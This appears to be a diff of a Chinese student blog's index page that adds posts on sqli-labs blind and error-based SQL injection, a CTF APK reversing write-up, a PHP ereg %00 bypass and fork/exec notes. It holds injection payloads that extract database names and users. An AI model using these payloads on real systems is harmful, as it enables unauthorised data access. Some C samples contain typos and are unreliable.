@@ -511,6 +511,312 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/20/sql-5/" itemprop="url">好玩的sql第五篇</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
+                2017-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
+                    <span itemprop="name">sql.fun</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>1-4篇是基础知识。 从第五篇开始是盲注的有关知识。</p>
+</blockquote>
+<p>上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来不是 <strong><em>直接输出</em></strong> 查询结果，而是利用 <strong><em>条件判断</em></strong> 来输出结果。</p>
+<blockquote>
+<p>一些小知识</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rand()：产生随机数</div><div class="line">floor()：取整</div><div class="line">count()：计数</div><div class="line">group by()：分组</div></pre></td></tr></table></figure>
+<h2 id="开始实验五"><a href="#开始实验五" class="headerlink" title="开始实验五"></a>开始实验五</h2><p><strong><em>第一步</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?id=1&apos; and left(select version(),1)=4--+ </div><div class="line">?id=1&apos; and length(database())=8--+</div><div class="line">?id=1&apos; and left(database(),1)=&apos;s&apos;--+</div></pre></td></tr></table></figure>
+<p>利用 <strong><em>left()</em></strong> 猜解版本、数据库长度、数据库名</p>
+<p><strong><em>第二步</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1),1,1))=&apos;*&apos;--+</div><div class="line"></div><div class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id LIMIT 0,1),1,1))=??</div></pre></td></tr></table></figure>
+<p>limit 0,1是表示获取 <strong><em>第一个表</em></strong> ，获取 <strong><em>第二个表</em></strong> 是limit 1,1</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/ctf-逆向-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/20/ctf-逆向-1/" itemprop="url">ctf.逆向.1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
+                2017-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf-逆向/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf.逆向</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p> 这次是对上次某被日平台未继续的比赛的总结。</p>
+<blockquote>
+<p>简单apk逆向</p>
+</blockquote>
+<p>做题的时候，对逆向完全不懂的我，打开了IDA然后一脸懵逼。<br>学长提示用 <strong><em>jadX.jar</em></strong> ,然后打开了flag.apk。<br>在目录中看到这个包： <strong><em>com.example.administrator.flag</em></strong><br>这直接告诉我们看这个包就能找到flag。</p>
+<blockquote>
+<p>以下列出重点代码</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">if (MainActivity.this.check(&quot;***admin***&quot;.trim(), MainActivity.this.pas.getText().toString().trim()))</div><div class="line"></div><div class="line">private boolean check(String user, String pass) throws NoSuchAlgorithmException &#123;</div><div class="line">        MessageDigest md5 = MessageDigest.getInstance(&quot;MD5&quot;);</div><div class="line">        md5.reset();</div><div class="line">        md5.update(user.getBytes());</div><div class="line">        String hexstr = bytes2hexstr(***md5***.digest());</div><div class="line">        StringBuilder sb = new StringBuilder();</div><div class="line">        for (int i = 0; i &lt; hexstr.length(); ***i += 2***) &#123;</div><div class="line">            sb.append(hexstr.charAt(i));</div><div class="line">        &#125;</div><div class="line">        return sb.toString().equals(pass);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>以上三个加粗的地方就是核心，告诉我们需要将<strong><em>admin</em></strong> <strong><em>MD5加密</em></strong>，然后<strong><em>再隔一位取</em></strong>就是flag。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -656,7 +962,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-6/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hhd">
@@ -675,7 +981,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/09/20/sql-6/" itemprop="url">好玩的sql第六篇</a></h1>
+                <a class="post-title-link" href="/2017/09/20/sql-3/" itemprop="url">好玩的sql第三篇</a></h1>
         
 
         <div class="post-meta">
@@ -749,7 +1055,9 @@
       
         
           
-            <p>不一样的就是id=1”<br>其余与第五篇一毛一样</p>
+            <p>第三篇与一二篇又有点类似，不过php写的形式有点不同，有些程序员花样就是多…</p>
+<p>同样输入?id=1’<br>以下是三次的对比错误返回：<br>1.Erreur de syntaxe près de ‘’1’’ LIMIT 0,1’ à la ligne 1<br>2.Erreur de syntaxe près de ‘’ LIMIT 0,1’ à la ligne 1<br>3.Erreur de syntaxe près de ‘’1’’) LIMIT 0,1’ à la ligne 1</p>
+<p>?id=1’) union select 1,2,3–+<br>与一二篇类似。</p>
 
           
         
@@ -893,161 +1201,6 @@
           
             <p>先挂网址：<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a><br>进去只是要输入passwd这个值<br>一头雾水，然后点击看代码<br>&lt;?php<br>if (isset ($_GET[‘password’])) {<br>    if (ereg (“^[a-zA-Z0-9]+$”, $_GET[‘password’]) === FALSE)<br>    {<br>        echo ‘</p><p>You password must be alphanumeric</p>‘;<br>    }<br>    else if (strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999)<br>    {<br>        if (strpos ($_GET[‘password’], ‘<em>-</em>‘) !== FALSE)<br>        {<br>            die(‘Flag: ‘ . $flag);<br>        }<br>        else<br>        {<br>            echo(‘<p><em>-</em> have not been found</p>‘);<br>        }<br>    }<br>    else<br>    {<br>        echo ‘<p>Invalid password</p>‘;<br>    }<br>}<br>?&gt;<br>就是几个if-else ，重点是那些函数的漏洞<br>ereg,后一个参数按照前一个参数那样子的形式就对了，可知我们只能输入字母和数字，但是…<br>接着是字数小于8这个比较容易，&gt;999999..什么的就用科学计数法，1e什么的都有提示<p></p>
 <h2 id="再接着需要有-这…我们就想到了c语言中的截断，但是-0不管用，后来看了答案知道用-00截断。然后就可以了…"><a href="#再接着需要有-这…我们就想到了c语言中的截断，但是-0不管用，后来看了答案知道用-00截断。然后就可以了…" class="headerlink" title="再接着需要有-这…我们就想到了c语言中的截断，但是\0不管用，后来看了答案知道用%00截断。然后就可以了…"></a>再接着需要有<em>-</em>这…我们就想到了c语言中的截断，但是\0不管用，后来看了答案知道用%00截断。然后就可以了…</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/20/sql-5/" itemprop="url">好玩的sql第五篇</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
-                2017-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
-                    <span itemprop="name">sql.fun</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>1-4篇是基础知识。 从第五篇开始是盲注的有关知识。</p>
-</blockquote>
-<p>上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来不是 <strong><em>直接输出</em></strong> 查询结果，而是利用 <strong><em>条件判断</em></strong> 来输出结果。</p>
-<blockquote>
-<p>一些小知识</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rand()：产生随机数</div><div class="line">floor()：取整</div><div class="line">count()：计数</div><div class="line">group by()：分组</div></pre></td></tr></table></figure>
-<h2 id="开始实验五"><a href="#开始实验五" class="headerlink" title="开始实验五"></a>开始实验五</h2><p><strong><em>第一步</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?id=1&apos; and left(select version(),1)=4--+ </div><div class="line">?id=1&apos; and length(database())=8--+</div><div class="line">?id=1&apos; and left(database(),1)=&apos;s&apos;--+</div></pre></td></tr></table></figure>
-<p>利用 <strong><em>left()</em></strong> 猜解版本、数据库长度、数据库名</p>
-<p><strong><em>第二步</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1),1,1))=&apos;*&apos;--+</div><div class="line"></div><div class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id LIMIT 0,1),1,1))=??</div></pre></td></tr></table></figure>
-<p>limit 0,1是表示获取 <strong><em>第一个表</em></strong> ，获取 <strong><em>第二个表</em></strong> 是limit 1,1</p>
-
           
         
       
@@ -1244,160 +1397,54 @@
 <p>进程控制</p>
 </blockquote>
 <p>内核创建新进程：并不用fork,vfork调用，属于系统启动一部分。<br>一般来说，创建新进程，调用fork，vfork函数。</p>
-<ol>
-<li>fork函数<br>创建子进程，完全复制父进程，与其共享数据段和堆栈区域。创建成功返回0，失败返回-1.<br>需要sys/types.h与unistd.h<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;sys/types.h&gt;</div><div class="line">#include&lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	pid_t pid;</div><div class="line">	printf(&quot;start the testing&quot;);</div><div class="line">	pid=fork();</div><div class="line">	printf(&quot;create successfully!pid=%d&quot;,pid);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li><p><strong>fork函数</strong></p>
+<p>创建子进程，完全复制父进程，与其共享数据段和堆栈区域。创建成功返回0，失败返回-1.<br>需要sys/types.h与unistd.h</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;sys/types.h&gt;</div><div class="line">#include&lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	pid_t pid;</div><div class="line">	printf(&quot;start the testing&quot;);</div><div class="line">	pid=fork();</div><div class="line">	printf(&quot;create successfully!pid=%d&quot;,pid);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 </li>
-</ol>
+</ul>
 <p>以上例子创建了一个新的进程，并可看出，成功则返回0。pid是专门的 <strong><em>pid_t</em></strong> 类型，fork的返回值是 <strong><em>pid</em></strong> ，fork <strong><em>无需参数</em></strong> 。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;sys/types.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;unistd.h&gt;</div><div class="line">#include&lt;sys/ipc.h&gt;</div><div class="line">#include&lt;sys/shm.h&gt;</div><div class="line">#define size 1024</div><div class="line">#define key 99</div><div class="line">int shmid;</div><div class="line">int j=5;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	int i,*pint;</div><div class="line">	pid_t pid;</div><div class="line">	char *addr;</div><div class="line">	</div><div class="line">	i=10;</div><div class="line">	shmid=shmget(size,key,	ipc_creat|0777);</div><div class="line">	pint=shmat(shmid,0,0);</div><div class="line">	*pint=100;</div><div class="line">	printf(&quot;start the test!\n&quot;);</div><div class="line">	pid=fork();</div><div class="line">	i++;</div><div class="line">	j++;</div><div class="line">	*pint+=1;</div><div class="line">	printf(&quot;pid=%d\n&quot;,pif);</div><div class="line">	printf(&quot;i=%d,j=%d\n&quot;,i,j);</div><div class="line">	printf(&quot;*pint=%d&quot;,*pint);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/汇编语言学习/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/20/汇编语言学习/" itemprop="url">汇编语言学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
-                2017-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/汇编语言/" itemprop="url" rel="index">
-                    <span itemprop="name">汇编语言</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>8086有20位地址总线，却只能传送16位地址，所以使用逻辑地址（段地址：偏移量）来表示，充分利用20位地址总线。</p>
+<p>子进程执行完之后pid返回0，接着执行父进程返回pid。</p>
+<ul>
+<li><strong>vfork函数</strong><br>也是创建新的子进程。不过主要目的就是用exec调用<strong>另外的程序</strong>。在vfork使用<strong>exec</strong>或<strong>exit</strong>函数之前，子进程与父进程是<strong>共享数据段</strong>的。而fork是复制父进程。vfork调用exec或exit之前，子进程先运行，<strong>父进程挂起</strong>，如果需要父进程的进一步活动，则会造成<strong>死锁</strong>。</li>
+</ul>
+<p>我感觉书上那个代码很弱智，就不写了。</p>
+<ul>
+<li><strong>exec函数</strong><br>用于系统调用，对进程执行新的目标程序。<br>exec函数会<strong>取代</strong>执行它的进程,  也就是说, 一旦exec函数执行成功, 它就<strong>不会返回</strong>了, 进程结束.   但是如果exec函数执行失败, 它会<strong>返回失败</strong>的信息（即-1）,  而且进程<strong>继续执行</strong>后面的代码!</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;unistd.h&gt;  </div><div class="line">  </div><div class="line">int execl(const char *path, const char *arg, ...);  </div><div class="line">  </div><div class="line">int execlp(const char *file, const char *arg, ...);  </div><div class="line">  </div><div class="line">int execle(const char *path, const char *arg, ..., char *const envp[]);  </div><div class="line">  </div><div class="line">int execv(const char *path, char *const argv[]);  </div><div class="line">  </div><div class="line">int execvp(const char *file, char *const argv[]);  </div><div class="line">  </div><div class="line">int execve(const char *path, char *const argv[], char *const envp[]);</div></pre></td></tr></table></figure>
+<p> exec函数分为三个部分，文件名或者文件路径部分，参数部分，环境变量部分。<br> 以上的函数定义是不是看起来很烦，我找到有个大佬总结了下，还挺舒服。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">e后续,参数必须带环境变量部分,环境变零部分参数会成为执行exec函数期间的环境变量, 比较少用</div><div class="line"></div><div class="line">l 后续,命令参数部分必须以&quot;,&quot; 相隔,最后1个命令参数必须是NULL</div><div class="line"></div><div class="line">v 后续,命令参数部分必须是1个以NULL结尾的字符串指针数组的头部指针.例如char * pstr就是1个字符串的指针,char * pstr[] 就是数组了,分别指向各个字符串.</div><div class="line"></div><div class="line">p后续,执行文件部分可以不带路径, exec函数会在$PATH中找</div></pre></td></tr></table></figure>
+<p>如果还是看着烦，就看例子吧。</p>
+<p><strong>execv()</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">int childpid;  </div><div class="line">int i;  </div><div class="line">      </div><div class="line">if (fork() == 0)</div><div class="line">&#123;  </div><div class="line">	//child process  </div><div class="line">	char * execv_str[] = &#123;&quot;echo&quot;, &quot;executed by execv&quot;,NULL&#125;;  </div><div class="line">	if (execv(&quot;/usr/bin/echo&quot;,execv_str) &lt;0 )</div><div class="line">	&#123;  </div><div class="line">		perror(&quot;error on exec&quot;);  </div><div class="line">		exit(0);  </div><div class="line">	&#125;  </div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;  </div><div class="line">		/parent process  </div><div class="line">		wait(&amp;childpid);  </div><div class="line">		printf(&quot;execv done\n\n&quot;);  </div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><strong>execv(“/usr/bin/echo”,execv_str)</strong>可以看出只需要<strong>两个参数</strong>，一个<strong>路径名</strong>，一个<strong>数组</strong>，但是这个程序不要轻易尝试，原因试试就知道了。</p>
+<p><strong>execvp()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">if (fork() == 0)</div><div class="line">&#123;  </div><div class="line">        //child process  </div><div class="line">        char * execvp_str[] = &#123;&quot;echo&quot;, &quot;executed by execvp&quot;,&quot;&gt;&gt;&quot;, &quot;~/abc.txt&quot;,NULL&#125;;  </div><div class="line">        if (execvp(&quot;echo&quot;,execvp_str) &lt;0 )</div><div class="line">        &#123;  </div><div class="line">            perror(&quot;error on exec&quot;);  </div><div class="line">            exit(0);  </div><div class="line">        &#125;  </div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;  </div><div class="line">        //parent process  </div><div class="line">        wait(&amp;childpid);  </div><div class="line">        printf(&quot;execvp done\n\n&quot;);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>execvp(“echo”,execvp_str)</strong> 文件名加数组</p>
+<p>举两个例子吧，大概能记住了吧。</p>
+<hr>
 <blockquote>
-<p>物理地址=段地址*16+偏移量</p>
+<p>fork()函数与exec()函数的联合使用</p>
 </blockquote>
-<p>内存并没有分段，只是CPU将其分段。一个段最大长度为64K。也就是允许0~FFFFH的偏移量。</p>
+<p>这个书上的例子还不错，我就把他打印下来。这是一个文件监控程序，修改后就建立一个副本，我觉得还是可以的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;sys/types.h&gt;</div><div class="line">#include&lt;unistd.h&gt;</div><div class="line">#include&lt;fcntl.h&gt;</div><div class="line">#include&lt;sys/stat.h&gt;</div><div class="line"></div><div class="line">int main(int argc,char *argv[])</div><div class="line">&#123;</div><div class="line">	int fd;</div><div class="line">	int stat,pid;</div><div class="line">	struct stat stbuf;</div><div class="line">	time_t old time=0;</div><div class="line">	if(argc!=3)</div><div class="line">	&#123;</div><div class="line">		fprintf(stderr,&quot;参数错误！&quot;);</div><div class="line">		return 1;</div><div class="line">	&#125;</div><div class="line">	if((fd=open(argv[1],O_RDONLY))==-1)</div><div class="line">	&#123;</div><div class="line">		fprintf(stderr,&quot;无法打开文件！&quot;);</div><div class="line">	&#125;</div><div class="line">	fstat(fd,&amp;stbuf);</div><div class="line">	old_time=stbuf.st_mtime;</div><div class="line">	for(;;)</div><div class="line">	&#123;</div><div class="line">		fstat(fd,&amp;stbuf);</div><div class="line">		if(old_time!=stbuf.st_mtime)</div><div class="line">		&#123;</div><div class="line">			while(pid=fork()==-1);</div><div class="line">		if(pid==0)</div><div class="line">		&#123;</div><div class="line">			execl(&quot;/bin/cp&quot;,&quot;/bin/cp&quot;,argv[1],argv[2],0);</div><div class="line">			return 3;</div><div class="line">		&#125;</div><div class="line">		wait(&amp;stat);</div><div class="line">		old_time=stbuf.st_mtime;</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">			sleep(30);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">后台执行：./文件名 file file.bak&amp;</div></pre></td></tr></table></figure>
+<ul>
+<li><p>system()函数</p>
+<p>参数为一个指针。<br>指针为空返回1；<br>exec错误返回退出时的返回值；<br>调用成功返回shell的结束状态。</p>
+</li>
+</ul>
+<p>例子不举了，因为我要去洗头了。。</p>
+<hr>
 <blockquote>
-<p>mov指令无法修改CS与IP，可以利用jmp来修改：jmp 段地址：偏移地址</p>
+<p>进程结束</p>
 </blockquote>
+<p>三种正常结束：return exit _exit<br>两种异常结束</p>
+<blockquote>
+<p>进程等待</p>
+</blockquote>
